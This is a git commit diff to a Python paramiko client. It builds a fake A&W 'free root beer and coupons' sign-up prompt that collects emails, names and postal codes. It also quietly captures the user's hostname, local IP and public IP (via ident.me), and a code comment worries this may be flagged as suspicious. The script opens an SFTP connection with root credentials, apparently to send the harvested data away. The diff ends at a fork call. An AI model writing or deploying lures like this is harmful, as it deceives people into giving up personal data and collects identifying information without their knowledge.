61b94d779ea7ec57b2861a934719b6e08d257a2c
Alistair Godwin <godwinalistair@hotmail.com>
2020-04-13 16:44:43 -0400

    Client adjustments

--- paramiko_client.py
+++ paramiko_client.py
@@ -37,23 +37,28 @@ import threading
 import subprocess
 import sys
 import os
+import re
+import socket #to capture the local IP
+import urllib.request # to capture the public ip
 
 
 
 
 def fetchSFTP():
+    '''
+    This function handles the connection and creation of SSH and SFTP connections to a target server.
+    When an exception occurs, disconnect from the server if possible.
+    @returns - SFTP - A connected SFTP object 
+    '''
     try:
+        sftp = 0
+        client = 0
         host = "::1"
         port = 9000
         usr,  pwd = 'root', 'toor'
         
         key = paramiko.RSAKey(filename='test_rsa.key')
-        
-        ''''
-        transport = paramiko.Transport(('::1', 9000))
-        transport.connect(usr, pwd, pkey=key)
-        sftp = paramiko.SFTPClient.from_transport(transport)
-        '''
+
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         client.connect(host,port, usr, pwd,  key)
@@ -61,7 +66,7 @@ def fetchSFTP():
         sftp = client.open_sftp()
         sftp.sshclient = client
         
-        #TEST
+        #TEST FILE - TODO REMOVE
         file = open("mytestfile.txt",  "a")
         file.write("Runescape Sucks")
         file.close()
@@ -70,35 +75,80 @@ def fetchSFTP():
         return sftp
     except Exception as e:
         print("Unhandled exception ->"+ str(e))
-        
-        if sftp:
+        if sftp != 0:
             sftp.close()
-        if client:
+        if client != 0:
             client.close()
     
     #--------------End of fetch SFTP-----------#
 
-fetchSFTP()
-signUp = "y"
-infoBank = []
-while True:
-    while(signUp == "y"):
-        print("Welcome to A&W Free Root Beer & Coupouns Promotion! \n")
-        email = input("Please enter your email to begin: ")
+def getInput():
+    '''
+    This function handles the input and validation of the program. 
+    It also collects some secondary information related to an IP address.
+    @returns - array - The array of voluntarily given information
+    '''
 
-        print('Hello {} '.format(email))
-        print("\nWe will now begin sign up for your free root beer and A&W coupons...")
-        firstName = input("Enter your first name: ")
-        lastName = input("Enter your last name: ")
-        postalCode = input("Enter your postal code for local offers: ")
+    infoBank = list()
+    detail = 0
+    regexEmail = '^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$' # server should expect validated email
 
-        userInfo = [email,firstName,lastName,postalCode]
+    print("Welcome to A&W Free Root Beer & Coupouns Promotion! \n")
+    print("At A & W, we pride ourselves on getting to know our customers.\n By giving us your email, we promise to send you only the best deals straight from our hearts to yours.")
+    while(detail == 0):
+        email = input("Please enter an email to begin: ")         
+
+        while not re.match(regexEmail, email): #validate an email
+            email = input("That email doesnt look right. Try Again:")    
             
-        signUp = input("Thank you! You are now signed up for free rewards. \
-        \nWould you like to sign up another user?  y/n: ")
+        print("Thanks! We only need your email, but for local offers we need more info. Enter more information?")
+        
+        while (detail != "Y") and (detail != "N"):
+            detail = input("Y/N: ")
+        
+        if detail == "Y":
+            firstName = input("Enter your first name: ")
+            lastName = input("Enter your last name: ")
+            postalCode = input("Enter your postal code for local offers: ")
+            
+        else:
+            firstName = "Friendly"
+            lastName = "User"
+            postalCode = "K7P 1A3"
+
+        name, local, public = getIPaddr() # could be flagged as suspicious traffic to ident.me ? 
+        userInfo = [email,firstName,lastName,postalCode, name,local,public]
+            
+        print("Thank you! You are now signed up for free rewards. \
+        \nWould you like to sign up another user?")
+        detail = 0
+        while (detail != "Y") and (detail != "N"):
+            detail = input("Y/N: ")
+        if detail == "Y":
+            detail = 0
 
         infoBank.append(userInfo)
-        print(infoBank)
+    
+    print("Please visit http://www.awcoupon.ca/en and login using the email you provided and password of 'P@ssw0rd'")
+    print("From our family to yours, thank you for choosing A&W. Goodbye!")
+    return infoBank
+     #---------------End of GetInput-----------------#
+
+def getIPaddr():
+    '''
+    This function handles the capture of the user's private IP address, hostname, and public IP
+    @returns - host, ip, external_ip
+    '''
+    ip = 0
+    host = socket.gethostname()    
+    ip = socket.gethostbyname(host)    
+    external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
+
+    return host, ip, external_ip    
+
+while True:
+    sftp = fetchSFTP()
+    infoBank = getInput()
     try:
         pid = os.fork()
     except OSError:
